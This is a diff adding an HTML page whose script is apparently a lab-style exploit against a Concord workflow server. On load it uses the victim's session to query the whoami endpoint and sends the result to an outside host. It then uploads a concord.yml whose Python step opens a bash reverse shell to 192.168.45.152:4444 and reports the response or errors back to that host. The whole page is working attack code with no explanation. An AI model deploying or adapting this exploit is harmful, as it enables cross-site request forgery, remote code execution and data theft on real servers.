@@ -1,0 +1,50 @@
+<html>
+  <head>
+    <script>
+      const yml = `
+configuration:
+  dependencies:
+    - "mvn://org.python:jython-standalone:2.7.2"
+flows:
+  default:
+    - script: python
+      body: |
+        import subprocess
+        subprocess.Popen("bash -c 'bash -i >& /dev/tcp/192.168.45.152/4444 0>&1'", shell=True)
+`;
+			
+			function rce() {
+        const ymlBlob = new Blob([yml], { type: "application/yml"});
+        const fd = new FormData();
+        fd.append("concord.yml", ymlBlob);
+
+        fetch("http://concord:8001/api/v1/process", {
+          method: "POST",
+          credentials: "include",
+          body: fd
+        })
+        .then(res => res.text())
+        .then(data => {
+          fetch("http://192.168.45.152/?msg=" + data)
+        }).catch(err => {
+          fetch("http://192.168.45.152/?err=" + err)
+        });
+      }
+
+      fetch("http://concord:8001/api/service/console/whoami", {
+        credentials: "include"
+      })
+      .then(async (res) => {
+        if (res.status != 401) {
+          const data = await res.text();
+          fetch("http://192.168.45.152/?msg=" + data)
+          rce();
+        } else {
+          fetch("http://192.168.45.152/?msg=userNotLoggedIn")
+        }
+      })
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
